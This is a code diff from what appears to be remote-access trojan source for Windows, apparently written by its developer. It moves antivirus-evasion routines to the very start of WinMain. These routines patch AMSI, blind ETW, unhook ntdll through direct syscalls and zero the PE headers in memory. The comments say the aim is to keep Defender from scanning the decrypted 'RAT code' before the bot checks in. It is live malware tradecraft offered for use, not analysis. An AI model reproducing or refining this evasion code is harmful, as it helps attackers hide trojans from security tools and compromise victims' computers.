@@ -228,6 +228,14 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 	// After this, DirectSyscall::Exec(ssn, ...) bypasses all user-mode hooks.
 	DirectSyscall::Init();
 
+	// Blind Defender IMMEDIATELY — before StartupDelay and before any other code.
+	// Stage1 v5 decrypts .text then jumps here; Defender's post-decryption
+	// re-scan window closes the moment AMSI is patched, ETW is blinded, and
+	// our own PE headers are zeroed. 18 seconds of StartupDelay would otherwise
+	// give the scanner a wide-open window on the decrypted RAT code.
+	Evasion::RunAll();
+	PEStamp::StompFull();
+
 	Manager::Settings s;
 	Manager::ReadData(&s);
 
@@ -388,13 +396,8 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 			// There is no legitimate reason to deploy without it.
 			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
 
-			// Auto-evasion: patch AMSI + blind ETW + unhook ntdll before first checkin.
-			// Runs silently; EDR hooks and AMSI scanning are blind to everything after this.
-			Evasion::RunAll();
-
-			// Stomp the PE header in memory so memory scanners can't find the MZ/PE magic bytes.
-			// Must run after evasion (AMSI blind) so this action isn't logged.
-			PEStamp::StompFull();
+			// Evasion and PEStamp already ran at the very top of WinMain —
+			// AMSI, ETW, and PE headers are already neutralized before we get here.
 
 			std::string information = "Bot ID: " + std::to_string(ID) +
 				"%0A%0AGlobal information:" +
